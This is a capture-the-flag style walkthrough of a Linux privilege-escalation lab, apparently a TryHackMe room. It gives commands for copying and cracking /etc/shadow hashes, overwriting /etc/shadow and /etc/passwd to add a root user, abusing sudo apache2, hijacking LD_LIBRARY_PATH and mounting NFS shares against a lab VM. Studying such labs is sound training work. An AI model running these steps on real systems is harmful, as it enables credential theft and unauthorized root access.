# Linux PrivEsc

## :desktop: Deploy the Vulnerable Debian VM <a href="#title" id="title"></a>

### &#x20;#2 Run the "id" command. What is the result?

```
sshpass -p password321 ssh user@10.10.177.44
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-34-25.png>)

## :space\_invader: Service Exploits

### #1&#x20;

```
```

## :busts\_in\_silhouette: Weak File Permissions - Readable /etc/shadow

### **#1 What is the root user's password hash?**

```
scp user@10.10.177.44:/etc/shadow .
cut -d ':' -f 2 shadow | head -1 > sha512.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-43-11.png>)

### #2 **What hashing algorithm was used to produce the root user's password hash?**

```
sha512crypt
```

### #3 What is the root user's password?

```
hashcat -a 0 -m 1800 sha512.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-43-24.png>)

## :busts\_in\_silhouette: Weak File Permissions - Writable /etc/shadow

```bash
scp user@10.10.177.44:/etc/shadow .
openssl passwd -6 password1234
vim shadow
scp shadow user@10.10.177.44:/etc/shadow
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-57-34.png>)

## :key: Weak File Permissions - Writable /etc/passwd

### #1 **Run the "id" command as the newroot user. What is the result?**

```bash
scp user@10.10.177.44:/etc/passwd .
openssl passwd password
vim passwd
scp passwd user@10.10.177.44:/etc/passwd
ssh newroot@10.10.177.44 id
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-08-22.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-12-37.png>)

## :man\_superhero: Sudo - Shell Escape Sequences

### #1 **How many programs is "user" allowed to run via sudo?**&#x20;

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-17-35.png>)

### **#2 One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?**

```
apache2
```

### #3 **Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.**

```bash
sudo /usr/bin/apache2 -f /etc/shadow
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-23-33.png>)

## :man\_superhero: Sudo - Environment Variables

```
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-35-54.png>)

```
LD_LIBRARY_PATH=/tmp ldd /usr/sbin/apache2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-36-49.png>)

## :file\_cabinet: NFS

```
mkdir -p /tmp/nfs
sudo mount 10.10.177.44:/tmp/ /tmp/nfs/
```

```
```

\#1&#x20;

## :link: Support Material

{% embed url="https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow" %}

{% embed url="https://gtfobins.github.io/" %}
